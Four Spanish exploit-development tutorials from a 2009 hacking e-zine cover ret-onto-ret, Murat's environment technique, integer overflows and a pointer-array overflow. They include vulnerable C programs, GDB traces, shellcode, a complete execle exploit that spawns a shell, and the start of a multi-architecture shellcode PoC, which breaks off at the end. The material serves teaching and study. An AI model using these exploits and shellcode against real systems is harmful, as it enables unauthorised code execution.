@@ -1,0 +1,1153 @@
+-[ 0x03 ]--------------------------------------------------------------------
+-[ Bazar de SET ]------------------------------------------------------------
+-[ by Varios Autores ]-----------------------------------------------SET-37--
+
+
+-[ ID ] - [              TITULO               ] - [  TEMA  ] - [  AUTOR  ]-
+
+  3x01     Tecnica Ret-onto-Ret                    Hacking      blackngel
+
+  3x02     Tecnica de Murat                        Hacking      blackngel
+
+  3x03     Overflow de Enteros                     Hacking      blackngel
+
+  3x04     Un Exploit Automatico                   Hacking      blackngel
+
+
+
+-[ 3x01 ]--------------------------------------------------------------------
+-[ Tecnica Ret-onto-Ret ]----------------------------------------------------
+-[ by blackngel ]------------------------------------------------------------
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+Los creadores de exploits, sobre todo aquellos cuya obsesion es lograr
+que sus exploits no fallen por culpa de los offsets y las direcciones
+hardcodeadas, necesitan de tecnicas que aseguren que sus programas de
+ataque funcionen en la mayoria de las ocasiones.
+
+Desde luego, cuando uno presenta una prueba de concepto, desea que esta
+no te deje quedar mal ante imprevistos.
+
+La tecnica "ret-onto-ret", es una tecnica que muchos obvian o que otros
+no conocen por falta de curiosidad; pero es lo mas sencillo que uno pueda
+imaginar.
+
+En un buffer overflow clasico, siempre se intenta acceder al principio
+de un buffer local sobreescribiendo la direccion de retorno con el valor
+de ESP. Luego se utiliza un offset o desplazamiento para caer en el lugar
+adecuado.
+
+La cuestion es que las variables locales no son el unico lugar donde se
+encuentran los datos proporcionados por el usuario. Por ejemplo, en un
+programa como este:
+
+void vuln(char *str)
+{
+   char buffer[256];
+   strcpy(buffer, str);
+}
+
+int main(int argc, char *argv[])
+{
+   if (argc > 1)
+      vuln(argv[1]);
+   return 0;
+}
+
+Existen 3 lugares donde podemos encontrar la cadena proporcionada por el
+usuario:
+
+ 1) Los argumentos pasados al programa.
+ 2) El buffer local "buffer[]".
+ 3) Los argumentos pasados a la funcion.
+
+Vale, el tercer punto es muy importante. Cuando una funcion es llamada,
+estamos acostumbrados a hacernos una idea de la pila una vez que el
+prologo de funcion es completado:
+
+ ESP
+  !
+  [ buffer(256) ][ EBP ][ EIP ]
+
+Pero que hay si seguimos subiendo por la pila:
+
+  [ buffer(256) ][ EBP ][ EIP ][ &str ]
+
+Veamoslo con GDB:
+
+blackngel@linux:~$ gcc-3.3 ror.c -o ror
+blackngel@linux:~$ gdb -q ./ror
+(gdb) disass vuln
+Dump of assembler code for function vuln:
+0x08048374 <vuln+0>:    push   %ebp
+0x08048375 <vuln+1>:    mov    %esp,%ebp
+0x08048377 <vuln+3>:    sub    $0x118,%esp
+0x0804837d <vuln+9>:    mov    0x8(%ebp),%eax
+0x08048380 <vuln+12>:   mov    %eax,0x4(%esp)
+0x08048384 <vuln+16>:   lea    -0x108(%ebp),%eax
+0x0804838a <vuln+22>:   mov    %eax,(%esp)
+0x0804838d <vuln+25>:   call   0x80482b8 <strcpy@plt>
+0x08048392 <vuln+30>:   leave  
+0x08048393 <vuln+31>:   ret    
+End of assembler dump.
+
+(gdb) break *vuln+9
+Breakpoint 1 at 0x804837d
+(gdb) run `perl -e 'print "A"x300'`
+Starting program: /home/blackngel/ror `perl -e 'print "A"x300'`
+
+Breakpoint 1, 0x0804837d in vuln ()
+(gdb) x/4x $ebp
+0xbffff3f8:     0xbffff408      0x080483ba      0xbffff5fd      0x080483e0
+(gdb)               |               |                |
+                    |               |                |
+                   EBP             EIP             *str
+
+Es esto cierto?
+
+(gdb) x/16x 0xbffff5fd
+0xbffff5fd:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff60d:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff61d:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff62d:     0x41414141      0x41414141      0x41414141      0x41414141
+
+Parece ser que si, y ademas no encontramos ninguna basura delante, asi que
+de sobreescribir EIP con esta direccion, no precisariamos de offset alguno.
+
+Vale esto esta bien, pero que pasa si nos encontramos con un programa como
+el siguiente:
+
+[-----]
+
+#include <stdio.h>
+
+int func(char *arg)
+{
+   char  buf[40];
+
+   strncpy(buf , arg , 64);
+   return 0;
+}
+
+int main(int argc, char *argv[])
+{
+   if(strchr(argv[1] , 0xbf)) {
+      printf("Intento de Hacking\n");
+      exit(1);
+   }
+
+   func(argv[1]);
+   return 0;
+}
+
+[-----]
+
+Exacto, que no podemos introducir en nuestra cadena ningun caracter "0xbf",
+entonces podemos ir olvidandonos de sobreescribir EIP con "0xbffff5fd".
+
+Aqui "ret-onto-ret" al rescate:
+
+El puntero ESP es importantisimo para la comprension de este metodo. Cuando
+una funcion retorna, es decir, el epilogo de funcion es ejecutado, ESP se
+iguala a EBP, luego el siguente valor en la pila es POPeado, que resulta ser
+EIP, y lo que ahi se encuentre sera ejecutado:
+
+   Antes:
+
+   -> ESP   
+   [ variables locales] [ EBP ] [ EIP ]
+
+   Despues:
+                        -> ESP   
+   [ variables locales] [ EBP ] [ EIP ]
+
+Bien, asi que con una instruccion "ret" tomamos EIP, y ejecutamos su
+contenido, cabe pensar que, si ejecutamos otro "ret", podemos POPear
+otro valor como EIP y ejecutar su contenido.
+
+El objetivo de "ret-onto-ret" es sobreescribir en primera instancia EIP
+con la direccion de una instruccion "ret". Cuando esta instruccion sea
+ejecutada, hara su funcion, que es POPear otro valor de la pila, en este
+caso como el EIP real ya fue POPeado, lo siguiente encima de la pila sera
+&str, y el flujo del programa ejecutara lo que alli se encuentre.
+
+Es muy facil encontrar una instruccion "ret" dentro de un programa, ya que
+siempre hay un minimo de una funcion, ademas los binarios de Linux incluyen
+otros metodos internos. Veamos:
+
+blackngel@mac:~$ objdump -d ./ror
+
+./ror:     file format elf32-i386
+
+Disassembly of section .init:
+080482c4 <_init>:
+ ........
+ ........
+ 80482f2:       c9                      leave  
+ 80482f3:       c3                      ret    
+Disassembly of section .plt:
+
+ ........
+ ........  
+
+080483a0 <__do_global_dtors_aux>:
+ ........
+ ........
+ 80483dd:	c3                   	ret    
+ 80483de:	66 90                	xchg   %ax,%ax
+
+080483e0 <frame_dummy>:
+ ........
+ ........
+ 8048413:	c3                   	ret    
+
+08048414 <func>:
+ ........
+ ........
+ 8048439:	c9                   	leave  
+ 804843a:	c3                   	ret    
+
+0804843b <main>:
+ ........
+ ........
+ 8048494:	c9                   	leave  
+ ........
+ ........    
+
+080484a0 <__libc_csu_fini>:
+ ........
+ ........
+ 80484a4:	c3                   	ret    
+ ........
+ ........
+
+080484b0 <__libc_csu_init>:
+ ........
+ ........
+ 8048509:	c3                   	ret    
+
+0804850a <__i686.get_pc_thunk.bx>:
+ 804850a:	8b 1c 24             	mov    (%esp),%ebx
+ 804850d:	c3                   	ret    
+ ........
+ ........  
+
+08048510 <__do_global_ctors_aux>:
+ ........
+ ........
+ 804853f:	c3                   	ret    
+Disassembly of section .fini:
+
+08048540 <_fini>:
+ ........
+ ........
+ 804855a:	c9                   	leave  
+ 804855b:	c3                   	ret    
+
+Bien, entonces parece que podemos aburrirnos escogiendo cualquiera de las
+direcciones, probemos por ejemplo con la que se encuentra en la seccion
+DTORS: "0x080483dd".
+
+Comprobemos que ocurre:
+
+(gdb) run `perl -e 'print "A"x60 . "\xdd\x83\x04\x08"'`
+Start program: /home/blackngel/ror `perl -e 'print "A"x60 . "\xdd\x83\x04\x08"'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbffff726 in ?? ()
+(gdb) x/4x 0xbffff726
+0xbffff726:	0x080483dd	0x47504700	0x4547415f	0x495f544e
+
+(gdb) x/4x 0xbffff726-12
+0xbffff71a:	0x41414141	0x41414141	0x41414141	0x080483dd
+(gdb) 
+
+Esto es interesante, el programa no da el fallo de segmentacion justo al
+principio del parametro de funcion, sino justo al final. Esto tiene una
+facil explicacion, y es que en realidad "0x41" es una instruccion que en
+ensamblador significa: "inc %ecx".
+
+Como esta operacion es valida, el registro ECX ira aumentando como si eso
+fuera algo decidido por el programador.
+
+Mucha gente tiende a pensar que en linux solo hay una instruccion NOP, que
+es "0x90", y eso no es cierto, lo que ocurre es que es la mas inocua, ya
+que no modifica nada importante en el sistema. Pero a veces el incremento
+de un registro no influye para nada en la ejecucion de un Shellcode, piensa
+que si este Shellcode tiene una instruccion "xor ecx,ecx" al principio, da
+igual cuanto se haya incrementado antes de llegar a el. De modo que podrias
+utilizarlo como si de un "0x90" se tratase.
+
+No te preocupes por todo esto, la segunda instruccion "ret" saltara al
+principio de la cadena. Pongamos un Shellcode en su lugar:
+
+blackngel@linux:~$ ./ror `cat /tmp/sc``perl -e 'print "A" x 15 .
+                                             "\xdd\x83\x04\x08"'`
+sh-3.2$ exit
+exit
+blackngel@linux:~$
+
+Yeah! 
+
+Aqui lo teneis "ret-onto-ret" para su uso y disfrute!
+
+
+*EOF*
+
+-[ 3x02 ]--------------------------------------------------------------------
+-[ Tecnica de Murat ]--------------------------------------------------------
+-[ by blackngel ]------------------------------------------------------------
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+La tecnica de Murat es util cuando el buffer que si intenta atacar es realmente
+pequeno. En estas situaciones los argumentos no pueden ser utilizados para
+almacenar todo nuestro Shellcode.
+
+Puedes pensar que lo mas sencillo es almacenar el shellcode en una variable
+de entorno y apuntar a el, y si bien esto es cierto, dado que nosotros buscamos
+tecnicas que nos permitan afinar mucho mas el exito de nuestro exploit, vamos
+a hacer que el exploit no precise de interaccion ninguna con el usuario.
+
+La llamada execle(), permite ejecutar un binario con un entorno propio, de modo
+que cada variable sea seteada de forma individual.
+
+Todos los binarios ELF en Linux se mapean a partir de la direccion de memoria
+"0xbfffffff", esto ya deberias saberlo con tu experiencia. Pero... como esta
+estructurada la pila desde esta direccion?
+
+   [HEAP -> ] ... [ <- PILA ] [ARGUMENTOS][ENTORNO][NOMBRE PROGRAMA][4 BYTES]
+   |                                                                        |
+   Direcciones bajas de memoria                                    0xbfffffff
+
+Bien, los primeros 4 bytes son bytes NULL(0x00), luego viene el nombre del
+programa (ojo, esto NO es argv[0]). Y luego el entorno especifico del programa.
+
+Esto significa que si el entorno solo tuviera una variable. Su direccion seria
+esta:
+
+   addr = 0xbfffffff - 4 - strlen(nombre_prog) - strlen(variable)
+
+Normalmente esto requiere restar 1 byte mas.
+
+Veamos un programa vulnerable:
+
+[-----]
+
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+   char buff[10];
+   strcpy(buff, argv[1]);
+   return 0;
+}
+
+[-----]
+
+blackngel@mac:~/pruebas/bo$ gcc-3.3 murat.c -o murat
+
+Ahora solo nos queda ver el exploit:
+
+[-----]
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define BSIZE 144
+#define NOMBRE "./murat"
+
+char shellcode[] =
+     "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
+     "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
+     "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+     "\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+void main(int argc, char *argv[]) {
+
+  char *p;
+  char *env[] = {shellcode, NULL};
+  char *vuln[] = {NOMBRE, p, NULL};
+  int *ptr, addr;
+  int size;
+  int i;
+
+  size = BSIZE;
+
+  p = (char *) malloc(size * sizeof(char));
+  if(p == NULL) {
+     fprintf(stderr, "\nMemoria insuficiente\n");
+     exit(0);
+  }
+
+  addr = 0xbffffffa - strlen(shellcode) - strlen(NOMBRE) - 1;
+  printf("Usando direccion: [ %08x ]\n", addr);
+
+  ptr = (int *)p;
+  for (i = 0; i < BSIZE; i += 4)
+    *(ptr++) = addr;
+
+  execle(vuln[0], vuln, p, NULL, env);
+}
+
+[-----]
+
+En accion:
+
+blackngel@mac:~/pruebas/bo$ ./exploit
+Usando direccion: 0xbfffffbe
+sh-3.2$ exit
+exit
+blackngel@mac:~/pruebas/bo$ 
+
+PERFECTO! Y ademas, esta tecnica puede aplicarse tambien, como es logico, a
+buffer's de tamano mayor. La ventaja esta en que la direccion es exacta.
+
+Te invito a que utilices GDB para ir volcando valores de la memoria,
+comenzando con "(gdb) x/s 0xbfffffff-4" y seguir bajando para descubrir
+todo lo que te puedes encontrar. Es una buena forma de descubrir de un
+modo practico donde se encuentran todos los parametros que el programa
+utiliza a lo largo de su ejecucion.
+
+Puedes leer mucha mas informacion sobre este tema en el gran paper realizado
+por el propio Murat [murat(at)enderunix.org], en la siguiente direccion:
+
+   [1] Buffer Overflows Demystified, by Murat
+       http://gatheringofgray.com/docs/INS/shellcode/bof-stack3-murat.txt
+
+
+*EOF*
+
+-[ 3x03 ]--------------------------------------------------------------------
+-[ Overflow de Enteros ]-----------------------------------------------------
+-[ by blackngel ]------------------------------------------------------------
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+Ya que nos ha dado por hablar solo de temas de explotacion, quisiera dar aqui
+tan solo una pincelada acerca de lo que es un overflow de enteros y como
+sacar provecho de ellos.
+
+Desde luego, esta clase de bug, no es el mas facil de localizar, y para mas
+inri, no permite una ejecucion de codigo arbitrario tal y como lo consiguen
+toda clase de buffer overflows.
+
+Por el contrario, un overflow de entero provoca comportamientos indefinidos
+en el programa, que suelen terminar en una Denegacion de Servicio, o por que
+no, conllevar a alguna clase de overflow siempre que ese entero tome parte a
+la hora de decidir la longitud de un buffer.
+
+Vale, vale, pero que es un overflow de entero?
+
+Un entero es una variable que es almacenada en una zona de memoria. Esta zona
+o espacio es limitado, en un sistema de 32 bits, un entero ocupara 32 bits,
+y en un sistema de 64 bits, en consecuencia, un entero ocupara 64 bits.
+
+Y esto es importante, pues quiere decir que esta clase de variables poseen un
+valor limite que no deberia ser sobrepasado. Para un entero sin signo de 32
+bits, el valor maximo es: 4294967296.
+
+Debemos de aclarar ahora que existen dos tipos de entero: los que tienen
+signo, y los que no lo tienen.
+
+Aquellos que tienen signo, utilizan su bit mas significativo (MSB) o bit mas
+a la izquierda, como senalizador de si el valor almacenado en la variable es
+positivo o negativo.
+
+Los enteros sin signo (unsigned), simplemente no pueden almacenar valores
+negativos.
+
+Con estos conceptos, veamos entonces ahora nuevamente los rangos exactos:
+
+
+   o---------------------------------------------o
+   |     TIPO      |    MINIMO    |    MAXIMO    |
+   |---------------|--------------|--------------|
+   |int            | -2147483648  |  2147483647  |
+   |---------------|--------------|--------------|
+   |unsigned int   |      0       |  4294967296  |
+   |---------------|--------------|--------------|
+   |short          |    -32768    |     32767    |
+   |---------------|--------------|--------------|
+   |unsigned short |      0       |     65536    |
+   o---------------------------------------------o
+
+
+Pero dejemonos de teoria y vamos a ver un claro ejemplo del problema. El
+siguiente codigo representa un estilo de programacion inseguro.
+
+[-----]
+
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+// We are never deceived; we deceive ourselves. - Johann Wolfgang von Goethe
+
+void check_id(unsigned int id)
+{
+    if(id > 10) {
+        printf("\nID = %u\n", id);
+        execl("/bin/sh", "sh", NULL);
+    } else {
+        printf("Not today son\n");
+    }
+}
+
+int main(int argc, char *argv[]) 
+{
+    int id;
+    sscanf(argv[1], "%d", &id);
+		if(id > 10) { 
+			printf("Erm....no\n");
+			exit(-1);
+		}
+    check_id(id);
+
+    return 0;
+}
+
+[-----]
+
+El analisis es rapido: Si nuestro objetivo es ejecutar el Shell, parece
+que primero debemos desencadenar la llamada a "check_id()" y para ello
+"id" tiene que ser un valor inferior a 10. Pero una vez entramos dentro
+de dicha funcion, la Shell solo sera ejecutada si "id" es superior a 10.
+Y entonces... Como es esto posible?
+
+Dentro de "main()", la variable "id" es declarada como un "int" con signo,
+lo cual quiere decir que acepta tanto valores positivos como negativos.
+En cambio, "check_id()" recibe este valor como un "unsigned" lo cual quiere
+decir que no acepta valores negativos.
+
+Esto tiene un efecto desastroso: Si nosotros introducimos como argumento
+un valor de "-1", "id" pasara limpiamente el primer chequeo, ya que es mas
+pequeno que "10". No obstante, cuando esta variable es recogida por la
+funcion "check_id()", se produce un cast a unsigned. Y no piensen que "-1"
+se convierte a "1", NO, lo que ocurre es que se transforma en el penultimo
+valor mas grande que puede alcanzar un unsigned.
+
+Veamoslo:
+
+blackngel@mac:~$ gcc ovi.c -o ovi
+blackngel@mac:~$ ./ovi -1
+
+ID = 4294967295
+sh-3.2$ exit
+exit
+blackngel@mac:~$ 
+
+Este ejemplo ha sido instructivo, aunque no representa realmente lo que es
+un "integer overflow", ya que el problema se produce al realizar el "cast"
+y no al desbordar el entero.
+
+Veamos nuevamente otro ejemplo:
+
+[-----]
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+   int len;
+   unsigned int l;
+   char buffer[256];
+   int i;
+
+   len = l = strtoul(argv[1], NULL, 10);
+
+   printf("\nL = %u\n", l);
+   printf("\nLEN = %d\n", len);
+   if (len >= 256) {
+      printf("\nLongitud excesiva\n");
+      exit(1);
+   }
+
+   if (strlen(argv[2]) < l)
+      strcpy(buffer, argv[2]);
+   else
+      printf("\nIntento de HACK\n");
+
+   return 0;
+}
+
+[-----]
+
+El programa pide dos argumentos: el primero de ellos es la longitud de la
+cadena que sera pasada como segundo parametro.
+
+Ya que el buffer tiene un tamano arbitrario, debemos controlar que esa valor
+no sea superior a 256, eso es lo que hace la sentencia:
+
+   if (len >= 256)
+
+Pero claro, el usuario puede mentir, diciendo que pasa una cadena de "200"
+caracteres de largo, y pasando en realidad una muchisimo mas larga. Para
+evitar esto, se comprueba la longitud de argv[2] antes de copiar su contenido
+finalmente al buffer:
+
+   if (strlen(argv[2]) < l)
+      strcpy(buffer, argv[2]);
+
+El error radica en que la primera comprobacion se realizado sobre un "int"
+que en este caso era la variable "len", y la segunda sobre la variable "l"
+que es unsigned. Veamos una ejecucion normal:
+
+[-----]
+
+blackngel@mac:~$ gcc-3.3 ovi2.c -o ovi2
+blackngel@mac:~$ ./ovi2 200 `perl -e 'print "A"x300'`
+
+L = 200
+
+LEN = 200
+
+Intento de HACK
+blackngel@mac:~$
+
+[-----]
+
+Esta claro que este era el clasico intento para enganar al programa. Pero,
+que ocurriria si logramos desbordar la variable "len". Recordemos que el
+valor mas grande que puede almacenar es: 2147483647.
+
+Si proporcionamos un valor mas grande que este, este cambiara de signo de
+forma inmediata. No obstante, la variable unsigned "l" si puede almacenar
+ese valor. Esto provocara la siguiente catastrofe:
+
+   3147483648 -> len = -1147483648
+   3147483648 -> l   =  3147483648
+
+   if (-1147483648 >= 256) =  FALSE /* El programa continua */
+
+   if (strlen(argv[2]) < 3147483648)
+
+Lo cual quiere decir que el primer chequeo es superado, y cualquier argv[2]
+con una longitud inferior a 3147483648, sera copiada en el buffer. Esta
+claro que se producira un desbordamiento:
+
+[-----]
+
+blackngel@mac:~$ gdb -q ./ovi2
+(gdb) run 3147483648 `perl -e 'print "A"x300'`
+Starting program: /home/blackngel/ovi2 3147483648 `perl -e 'print "A"x300'`
+
+L = 3147483648
+
+LEN = -1147483648
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) 
+
+[-----]
+
+Esta es la base del problema, a partir de aqui puedes seguir investigando.
+Piensa que la mayoria de los desbordamientos de entero se producen por
+operaciones aritmeticas en las que no se comprueba si el resultado puede
+ser almacenado en la variable destino.
+
+Google es tu amigo, pero la mejor referencia que te puedo proporcionar es
+un paper de Phrack. Seguro que su lectura sera agradable:
+
+Basic Integer Overflows by blexim <blexim@hush.com>
+
+   http://www.phrack.org/issues.html?issue=60&id=10#article
+
+
+*EOF*
+
+-[ 3x04 ]--------------------------------------------------------------------
+-[ Un Exploit Automatico ]---------------------------------------------------
+-[ by blackngel ]------------------------------------------------------------
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+Todo comienza con una sencilla pregunta: Existe alguna aplicacion vulnerable
+a overflows que no precise de una direccion de retorno para su explotacion?
+
+La respuesta es afirmativa. Y en resumen, esto ocurre cuando EIP es desbordado
+con punteros establecidos por el propio programa y no con una cadena de
+caracteres como suele ser lo comun.
+
+Entremos directamente en materia con un programa vulnerable:
+
+[-----]
+
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+   char *ptrs[1024];
+   char *instring;
+   char *c;
+   char **p;
+
+   if (argc < 2)
+      exit(1);
+
+   instring = argv[1];
+
+   printf("PTRS = [ %p ]\n", &ptrs);
+   printf("INSTRING = [ %p ]", &instring);
+
+   for (p = ptrs, c = instring; *c != 0; c++) {
+      if (*c == '/') {
+         *p=c;
+          p++;
+      }
+   }
+}
+
+
+[-----]
+
+La funcion de este programa es almacenar en un buffer de punteros de tipo
+char, todos los directorios padres de de un fichero una vez que su PATH ha
+sido especificado.
+
+Imaginemos que pasamos como argumento lo siguiente: /home/black/bof/prueba.c
+
+Alguno podria pensar que nuestro buffer quedaria de la siguiente forma:
+
+ptrs[0] = "/home"
+ptrs[1] = "/black"
+ptrs[2] = "/bof"
+ptrs[3] = "/prueba.c"
+
+Y si bien tiene bastante buena pinta, esto no es realmente lo que ocurre.
+Lo cierto es que 'ptrs[]' almacena punteros a esas cadenas, lo cual es igual
+que decir que almacena las direcciones de memoria donde estas se encuentran.
+Algo asi:
+
+ptrs[0] = 0xbffffxxw -> "/home"
+ptrs[1] = 0xbffffxxx -> "/black"
+ptrs[2] = 0xbffffxxy -> "/bof"
+ptrs[3] = 0xbffffxxz -> "/prueba.c"
+
+Teniendo esto en mente, podemos ver que el programa no comprueba la longitud
+del parametro que sera procesado por el bucle 'for(;;)'. Entonces ahora nos
+planteamos dos preguntas:
+
+1) Que ocurre si pasamos una cadena de longitud superior a 1024 tal que asi:
+   "/aaaaaaaaaaaaaaaaaaaaaaa........(mas de 1024)" ?
+
+La respuesta es que no ocurre nada, ya que el bucle solo encontrara un
+caracter '/', y por lo tanto solo almacenara un puntero en ptrs[]. Esto
+es para que veas nuevamente que ptrs[] no se llena con caracteres, sino
+con punteros.
+
+2) Que ocurre si pasamos una cadena de longitud superior a 1024 tal que asi:
+   "////////////////////////........(mas de 1024)" ?
+
+Pues que acabaremos sobreescribiendo EIP con un puntero a una cadena de
+caracteres, algo como "0xbffffxxx".
+
+Bien, imaginemos entonces que calculamos la longitud exacta para no
+sobreescribir mas alla de EIP, y que la cadena pasada es algo como esto:
+
+   "//////////////////(mas y mas)///AAAA"
+   ^
+   |- 0xbffff643
+
+Supongamos que la direccion del primer caracter '/' es correcta, entonces
+ptrs[] tendra el siguiente aspecto:
+
+ESP-->
+      **p
+      *c
+      *instring;
+      ptrs[0] = 0xbffff643 -> "/"
+      ptrs[1] = 0xbffff644 -> "/"
+      ptrs[2] = 0xbffff645 -> "/"
+      ptrs[3] = 0xbffff646 -> "/"
+      .......
+      .......
+      ptrs[1024] = 0xbffffA43 -> "/"
+EBP-->ptrs[1025] = 0xbffffA44 -> "/"
+EIP-->ptrs[1026] = 0xbffffA45 -> "/AAAA"
+
+Correcto, hemos sobreescrito EIP con la direccion "0xbffffA45", lo cual
+provocara que cuando la funcion retorne, lo que haya en esa direccion
+sera ejecutado, que sera "/AAAA".
+
+En nuestro caso especifico, esa cadena no provocara nada, ya que la letra
+A en hexadecimal se traduce como 0x41, y traducido a una instruccion de
+procesador con arquitectura x86, significa "inc ecx". Digamos que nuestra
+aplicacion pasara de largo con estas instrucciones que solo incrementan
+el registro ECX, pero pronto se encontrara con codigos erroneos que seguro
+provocaran un fallo de segmentacion.
+
+Que ocurre entonces si colocamos ahi una Shellcode de nuestra preferencia?
+
+Exacto, que esta se ejecutara limpiamente, y no hemos tenido la necesidad
+de averiguar su direccion ni de sobreescribir EIP con esta, ya que la misma
+aplicacion lo ha hecho por nosotros de forma automatica, gracias al puntero
+que ha machacado su direccion original.
+
+Antes de pasar directamente al exploit, vamos a examinar un poco la pila para
+ver si esto es cierto:
+
+blackngel@mac:~$ gcc-3.3 ins.c -o ins
+blackngel@mac:~$ ./ins `perl -e 'print "/"x1050'`
+PTRS = [ 0xbfffe160 ]
+INSTRING = [ 0xbfffe15c ]
+Fallo de segmentacion
+blackngel@mac:~$ 
+
+En este ejecucion normal, vemos que la estructura que mostramos anteriormente
+es correcta, "instring" esta por detras del buffer "ptrs[]", teniendo su
+direccion base, miremos dentro del stack hasta llegar a EBP y EIP:
+
+blackngel@mac:~$ gdb -q ./ins
+(gdb) disass main
+Dump of assembler code for function main:
+0x080483a4 <main+0>:	push   %ebp
+0x080483a5 <main+1>:	mov    %esp,%ebp
+0x080483a7 <main+3>:	sub    $0x1028,%esp
+..........
+..........
+0x08048454 <main+176>:	leave  
+0x08048455 <main+177>:	ret    
+End of assembler dump.
+
+(gdb) break *main+176
+Breakpoint 1 at 0x08048454
+
+(gdb) run `perl -e 'print "/" x 1050'`
+
+Starting program: /home/blackngel/ins `perl -e 'print "/"x1050'`
+PTRS = [ 0xbfffe110 ]
+INSTRING = [ 0xbfffe10c ]
+
+Breakpoint 1, 0x08048454 in main ()
+(gdb) x/16x 0xbfffe110
+0xbfffe110:	0xbffff310	0xbffff311	0xbffff312	0xbffff313
+0xbfffe120:	0xbffff314	0xbffff315	0xbffff316	0xbffff317
+0xbfffe130:	0xbffff318	0xbffff319	0xbffff31a	0xbffff31b
+0xbfffe140:	0xbffff31c	0xbffff31d	0xbffff31e	0xbffff31f
+(gdb) 
+
+Hasta aqui todo bien, todas las direcciones tienen una diferencia de un byte,
+ya que esta es la longitud que hay entre un caracter "/" y el siguiente, si
+hubieramos utilizado una cadena como "/aaa/aaa/aaa" la distancia de cada
+puntero, seria obviamente de 4. Examinemos EBP y EIP:
+
+(gdb) x/4x $ebp   // EBP           //EIP
+0xbffff118:	0xbffff712	0xbffff713	0xbffff714	0xbffff715
+
+Asi que EIP apunta a 0xbffff713, que es la direccion de un caracter "/". Sera
+verdad?
+
+(gdb) x/4x 0xbffff713
+0xbffff713:	0x2f2f2f2f	0x2f2f2f2f	0x2f2f2f2f	0x2f2f2f2f
+
+Ya todos sabeis que el codigo hexadecimal de "/" es "0x2f". Bien, ahora solo
+queda buscar el punto exacto en que solo sobreescribamos EIP, de modo que lo
+que siga sea solo un Shellcode y no mas caracteres "/":
+
+(gdb) run `perl -e 'print "/"x1028'`
+...
+PTRS = [ 0xbfffe130 ]
+INSTRING = [ 0xbfffe12c ]
+len = atoi(argv[1]);
+(gdb) x/4x $ebp
+0xbffff138:	0xbffff728	0xbffff729	0x00000002	0xbffff1c4
+(gdb) x/x 0xbffff729
+0xbffff729:	0x5047002f -> Solo se ha colado un caracter "/", perfecto!
+
+En principio solo hay un detalle que salta a la vista, y es que lo primero
+se ejecutara antes de nuestro shellcode, sera el 0x2f, pero comprobaremos
+pronto que se traduce a una instruccion del procesador inofensiva que nos
+permite continuar sin problema alguno.
+
+Debido a lo especial de esta vulnerabilidad, ya que en ningun momento
+depende de la direccion de la shellcode, es el caso perfecto para crear
+un exploit que sea efectivo en multiples arquitecturas y diferentes
+sistemas operativos.
+
+Nosotros vamos seguidamente a desarrollar un exploit a tal efecto, y para
+ello nos ayudaremos del Shellcode Abarcador de Arquitectura y Sistemas
+Operativos publicado en el articulo "Architecture Spanning Shellcode" [1]
+escrito por "eugene@gravitino.net" (articulo de recomendada lectura).
+
+El siguiente programa, gracias al Shellcode utilizado, deberia ejecutarse
+correctamente en los siguientes sistemas y arquitecturas:
+
+   - x86 -> Linux, FreeBSD, NetBSD, OpenBSD
+   - MIPS/Irix
+   - Sparc/Solaris
+   - PPC/AIX (ver codigo)
+
+[-----]
+
+/*
+ *  PoC by blackngel
+ */
+
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define VULNPROG "./ins"
+#define DEFAULT_LEN 2048
+
+/*
+ * Architecture/OS Spanning Shellcode
+ *
+ * corre en x86 (freebsd, netbsd, openbsd, linux), MIPS/Irix, Sparc/Solaris
+ * y PPC/AIX (las plataformas AIX requieren el flag -DAIX del compilador)
+ *
+ * eugene@gravitino.net
+ */
+
+char sc[] =
+	/* voodoo */
+	"\x37\x37\xeb\x7b"	/* x86:		aaa; aaa; jmp 116+4	*/
+				/* MIPS:	ori	$s7,$t9,0xeb7b	*/
+				/* Sparc:	sethi	%hi(0xdFADEc00), %i3 */
+				/* PPC/AIX:	addic.	r25,r23,-5253	*/
+
+	"\x30\x80\x01\x14"	/* MIPS:	andi	$zero,$a0,0x114	*/
+				/* Sparc: 	ba,a	+1104		*/
+				/* PPC/AIX:	addic   r4,r0,276	*/
+
+	"\x1e\xe0\x01\x01"	/* MIPS:	bgtz	$s7, +1032	*/
+				/* PPC/AIX:	mulli	r23,r0,257	*/
+
+	"\x30\x80\x01\x14"	/* llena el slot de retardo de 
+				   ramificacion de MIPS con el anterior 
+				   nop de MIPS / AIX	                */
+
+
+	/* PPC/AIX shellcode by LAST STAGE OF DELIRIUM	*://lsd-pl.net/	*/
+	"\x7e\x94\xa2\x79"	/* xor.		r20,r20,r20		*/
+	"\x40\x82\xff\xfd"	/* bnel		<syscallcode>		*/
